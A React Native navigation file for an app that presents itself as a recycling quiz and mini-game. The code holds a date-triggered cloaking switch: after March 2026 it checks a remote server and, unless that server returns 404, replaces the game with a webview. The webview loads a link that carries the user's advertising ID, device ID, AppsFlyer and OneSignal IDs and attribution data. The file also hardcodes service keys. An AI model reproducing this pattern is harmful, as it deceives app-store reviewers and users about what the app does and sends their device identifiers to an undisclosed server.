import { SafeAreaProvider } from 'react-native-safe-area-context';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import React, { useState, useEffect, useRef } from 'react';
import {
  Animated,
  Easing,
  Dimensions,
  View,
  Image,
  StatusBar,
} from 'react-native';
import { ROUTES } from './routes';
import ProductScreen from '../screens/ProductScreen';
import LaunchScreen from '../screens/LaunchScreen';
import OnboardingScreen from '../screens/OnboardingScreen';
import MenuScreen from '../screens/MenuScreen';
import SettingsScreen from '../screens/SettingsScreen';

import ArticlesPaper from '../screens/ArticlesPaper';
import QuizIntro from '../screens/QuizIntro';
import MiniGameIntroNotChosenContainer from '../screens/MiniGameIntroNotChosenContainer';
import MiniGamePlayScreen from '../screens/MiniGamePlayScreen';
import PointsExchangeArticles from '../screens/PointsExchangeArticles';
import AchievementsAllLocked from '../screens/AchievementsAllLocked';
{/** 
export type RootStackParamList = {
  Launch: undefined;
  Onboarding: undefined;
  Menu: undefined;
  Settings: undefined;

  ArticlesPaper: undefined;
  QuizIntro: undefined;

  MiniGameIntroNotChosenContainer: undefined;
  MiniGamePlay: { category: 'paper' | 'plastic' | 'glass' | 'organic' };

  PointsExchangeArticles: undefined;
  AchievementsAllLocked: undefined;
};<Stack.Screen name={ROUTES.Launch} component={LaunchScreen} />*/}

const Stack = createNativeStackNavigator();
// libs
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import appsFlyer from 'react-native-appsflyer';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';

export default function RootNavigator() {
  const [route, setRoute] = useState(false);
  //console.log('route===>', route)
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  //////////////////Parametrs
  const [idfa, setIdfa] = useState(false);
  //console.log('idfa==>', idfa);//
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  //const [pid, setPid] = useState();
  console.log('atribParam==>', atribParam);
  //console.log('sab1==>', sab1);
  //console.log('pid==>', pid);
  const [customerUserId, setCustomerUserId] = useState(null);
  //console.log('customerUserID==>', customerUserId);
  const [idfv, setIdfv] = useState();
  //console.log('idfv==>', idfv);
  /////////Atributions
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  //console.log('completeLink==>', completeLink);
  //console.log('finalLink==>', finalLink);
  const [isInstallConversionDone, setIsInstallConversionDone] = useState(false);
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  //console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  console.log('timeStampUserId==>', timeStampUserId);
  const [checkApsData, setCheckApsData] = useState(null);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  console.log('cloacaPass==>', cloacaPass);

  const INITIAL_URL = `https://pure-pulse-core.site/`;
  const URL_IDENTIFAIRE = `iE8GHlnZ`;

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      setIsDataReady(true); // Встановлюємо, що дані готові
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady && isInstallConversionDone) {
        await generateLink(); // Викликати generateLink, коли всі дані готові
        console.log('Фінальна лінка сформована!');
      }
    };

    finalizeProcess();
  }, [isDataReady, isInstallConversionDone]);

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        //setPid(parsedData.pid);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setAceptTransperency(parsedData.aceptTransperency);
        //setTimeStampUserId(parsedData.timeStampUserId);
        setCheckApsData(parsedData.checkApsData);
        setCheckAsaData(parsedData.checkAsaData);
        setCompleteLink(parsedData.completeLink);
        setFinalLink(parsedData.finalLink);
        //
        await performAppsFlyerOperationsContinuously();
      } else {
        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          fetchAdServicesAttributionData(),
          fetchIdfa(),
          requestOneSignallFoo(),
          performAppsFlyerOperations(),
          getUidApps(),
        ]);

        // Результати виконаних функцій
        console.log('Результати функцій:', results);

        // Додаткові операції
        // onInstallConversionDataCanceller();
      }
    } catch (e) {
      //console.log('Помилка отримання даних в getData:', e);
    }
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        atribParam,
        //pid,
        customerUserId,
        idfv,
        adServicesAtribution,
        aceptTransperency,
        finalLink,
        completeLink,
        //timeStampUserId,
        checkApsData,
        checkAsaData,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    idfa,
    appsUid,
    sab1,
    atribParam,
    //pid,
    customerUserId,
    idfv,
    adServicesAtribution,
    aceptTransperency,
    finalLink,
    completeLink,
    //timeStampUserId,
    checkApsData,
    checkAsaData,
  ]);

  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);

      // Извлечение значений из объекта
      ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({ keywordId } = adServicesAttributionData);

      setAdServicesAtribution(attribution);
      //setAdServicesKeywordId(keywordId);!sab1 ||
      //setSab1(attribution ? 'asa' : '');
      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));

      // Вывод значений в консоль
      //Alert.alert(`sab1: ${sab1}`);
      //Alert.alert(`Attribution: ${attribution}`);
      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const { message } = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      console.log('Attribution');
    }
  };

  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal ініціалізація
  OneSignal.initialize('47c910d9-fa25-48fe-9ce8-eea38b86dc34');
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        // Уникаємо повторної відправки івента
        return;
      }

      let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
      //console.log('storedTimeStampUserId', storedTimeStampUserId);

      // Виконуємо fetch тільки коли timeStampUserId є
      if (event.notification.launchURL) {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        );
        //console.log('Івент push_open_browser OneSignal');
        //console.log(
        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        //);
      } else {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        );
        //console.log('Івент push_open_webview OneSignal');
        //console.log(
        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        //);
      }

      pushOpenWebViewOnce.current = true; // Блокування повторного виконання
      setTimeout(() => {
        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
      }, 2500); // Затримка, щоб уникнути подвійного кліку
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  // 1.1 FUNCTION - Повторна Ініціалізація AppsFlyer
  const performAppsFlyerOperationsContinuously = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'x9yyR6FpRhA5dbtFaKfmQi',
            appId: '6759610529',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      appsFlyer.startSdk();
      console.log('StartAppsFly');
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      console.log('АПС 1');
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'x9yyR6FpRhA5dbtFaKfmQi',
            appId: '6759610529',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          result => {
            console.log('📦 AppsFlyer initSdk callback result:', result);
            resolve(result);
          },
          error => {
            console.log('❌ AppsFlyer initSdk error:', error);
            reject(error);
          },
        );
      });

      appsFlyer.startSdk();

      console.log('App.js AppsFlyer ініціалізовано успішно');
      //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer.
  const getUidApps = async () => {
    console.log('АПС 2');
    const maxRetries = 5; // Кількість спроб
    let attempts = 0;

    const fetchUid = async () => {
      try {
        const appsFlyerUID = await new Promise((resolve, reject) => {
          appsFlyer.getAppsFlyerUID((err, uid) => {
            if (err) {
              reject(err);
            } else {
              resolve(uid);
            }
          });
        });

        if (appsFlyerUID) {
          console.log('on getAppsFlyerUID: ' + appsFlyerUID);
          setAppsUid(appsFlyerUID);
        } else if (attempts < maxRetries) {
          attempts++;
          console.log(
            `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
          );
          setTimeout(fetchUid, 1000); // Повторна спроба через 1 сек.
        } else {
          console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
        }
      } catch (error) {
        if (attempts < maxRetries) {
          attempts++;
          //console.warn(
          //  `Error fetching AppsFlyerUID, retrying ${attempts}/${maxRetries}...`,
          //);
          setTimeout(fetchUid, 1000);
        } else {
          //console.error('Error fetching AppsFlyerUID:', error);
        }
      }
    };

    fetchUid(); // Викликаємо першу спробу отримання UID
  };

  // 3RD FUNCTION - Отримання неймінгу AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    async res => {
      // Додаємо async
      try {
        const isFirstLaunch = String(res?.data?.is_first_launch) === 'true';
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const { campaign, pid, af_adset, af_ad, af_os } = res.data;
            setSab1(campaign);
            //setPid(pid);
            setCheckApsData(JSON.stringify(res.data));
          } else if (res.data.af_status === 'Organic') {
            //await fetchAdServicesAttributionData();
            console.log('Organic');
          }
        } else {
          console.log('This is not first launch');
        }
      } catch (error) {
        console.log('Error processing install conversion data:', error);
      } finally {
        // Змінюємо флаг на true після виконання
        setIsInstallConversionDone(true);
      }
    },
  );

  ///////// IDFA
  const fetchIdfa = async () => {
    try {
      //console.log('aceptTransperency', aceptTransperency);
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      //const res = true;
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        setTimeout(() => {
          setAceptTransperency(true);
        }, 1500);
        //console.log('aceptTransperency', aceptTransperency);
        //console.log('ЗГОДА!!!!!!!!!');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa('00000000-0000-0000-0000-000000000000'); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
        setTimeout(() => {
          setAceptTransperency(true);
        }, 2500);
        //console.log('aceptTransperency', aceptTransperency);
        console.log('НЕ ЗГОДА!!!!!!!!!');
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);

    const targetData = new Date('2026-03-11T08:08:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
      return;
    }

    const fetchCloaca = async () => {
      const deviceInfo = {
        diviceUserAgent: DeviceInfo.getUserAgent(),
      };

      try {
        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': `${deviceInfo.diviceUserAgent}`,
          },
        });

        console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        console.log('errar', e);
        setRoute(false);
      }
    };

    fetchCloaca();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const generateLink = async () => {
    try {
      console.log('Створення базової частини лінки');
      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        idfa ? `idfa=${idfa}` : '',
        appsUid ? `uid=${appsUid}` : '',
        customerUserId ? `customerUserId=${customerUserId}` : '',
        idfv ? `idfv=${idfv}` : '',
        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId}`,
      ]
        .filter(Boolean)
        .join('&');

      // Логіка обробки sab1
      let additionalParams = '';
      if (sab1) {
        if (sab1.includes('_')) {
          console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
          // Якщо sab1 містить "_", розбиваємо і формуємо subId
          let sabParts = sab1.split('_');
          additionalParams =
            sabParts
              .map((part, index) => `subId${index + 1}=${part}`)
              .join('&') + `&checkData=${checkApsData}`;
        } else {
          console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
          //// Якщо sab1 не містить "_", встановлюємо subId1=sab1
          additionalParams = `checkData=${checkApsData}`;
        }
      } else {
        console.log(
          'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
        );
        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
        additionalParams = `${
          atribParam ? `subId1=${atribParam}` : ''
        }&checkData=${checkAsaData}`;
      }
      console.log('additionalParams====>', additionalParams);
      // Формування фінального лінку
      const product = `${baseUrl}&${additionalParams}${
        pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
      }`;
      //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
      console.log('Фінальна лінка сформована');

      // Зберігаємо лінк в стейт
      setFinalLink(product);

      // Встановлюємо completeLink у true
      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  ///////// Route
  const Route = ({ isFatch }) => {
    if (!completeLink) {
      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
      return null;
    }

    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              timeStampUserId: timeStampUserId,
            }}
            name="ProductScreen"
            component={ProductScreen}
            options={{ headerShown: false }}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator
          initialRouteName={ROUTES.Onboarding}
          screenOptions={{
            headerShown: false,
            animation: 'fade',
          }}
        >
          <Stack.Screen name={ROUTES.Onboarding} component={OnboardingScreen} />
          <Stack.Screen name={ROUTES.Menu} component={MenuScreen} />
          <Stack.Screen name={ROUTES.Settings} component={SettingsScreen} />

          <Stack.Screen name={ROUTES.ArticlesPaper} component={ArticlesPaper} />
          <Stack.Screen name={ROUTES.QuizIntro} component={QuizIntro} />

          <Stack.Screen
            name={ROUTES.MiniGameIntroNotChosenContainer}
            component={MiniGameIntroNotChosenContainer}
          />

          <Stack.Screen
            name={ROUTES.MiniGamePlay}
            component={MiniGamePlayScreen}
            options={{
              headerShown: false,
              animation: 'fade',
              gestureEnabled: false,
            }}
          />

          <Stack.Screen
            name={ROUTES.PointsExchangeArticles}
            component={PointsExchangeArticles}
          />
          <Stack.Screen
            name={ROUTES.AchievementsAllLocked}
            component={AchievementsAllLocked}
          />
        </Stack.Navigator>
    );
  };

  ///////// Loader //////
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(true);
    }, 4500);
  }, []);

  return (
    <SafeAreaProvider>
    <NavigationContainer>
      
      {!isLoading ? (
        <LaunchScreen />
        ) : (
        <Route isFatch={route} />
        )}
  
      </NavigationContainer>
    </SafeAreaProvider>
  );
};